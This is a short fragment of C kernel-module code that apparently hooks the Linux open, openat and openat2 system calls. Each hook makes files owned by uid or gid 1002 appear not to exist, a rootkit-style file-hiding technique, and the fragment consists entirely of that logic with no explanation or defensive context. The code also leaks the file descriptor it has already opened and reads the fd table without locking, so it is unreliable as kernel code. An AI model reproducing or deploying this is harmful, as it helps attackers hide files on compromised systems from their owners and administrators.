
static asmlinkage long ex_sys_open(struct pt_regs *regs)
{
    long ret = real_sys_open(regs);

    if (ret < 0) {
        return ret;
    }
    
    struct inode *f_inode = current->files->fdt->fd[(int)ret]->f_inode;

    if (f_inode->i_uid.val == 1002 || f_inode->i_gid.val == 1002) {
        ret = -ENOENT;
    }

    return ret;
}

static asmlinkage long ex_sys_openat(struct pt_regs *regs)
{
    long ret = real_sys_openat(regs);

    if (ret < 0) {
        return ret;
    } 

    struct inode *f_inode = current->files->fdt->fd[(int)ret]->f_inode;

    if (f_inode->i_uid.val == 1002 || f_inode->i_gid.val == 1002) {
        ret = -ENOENT;
    }

    return ret;
}

static asmlinkage long ex_sys_openat2(struct pt_regs *regs)
{
    long ret = real_sys_openat2(regs);

    if (ret < 0) {
        return ret;
    }

    struct inode *f_inode = current->files->fdt->fd[(int)ret]->f_inode;

    if (f_inode->i_uid.val == 1002 || f_inode->i_gid.val == 1002) {
        ret = -ENOENT;
    }

    return ret;
}
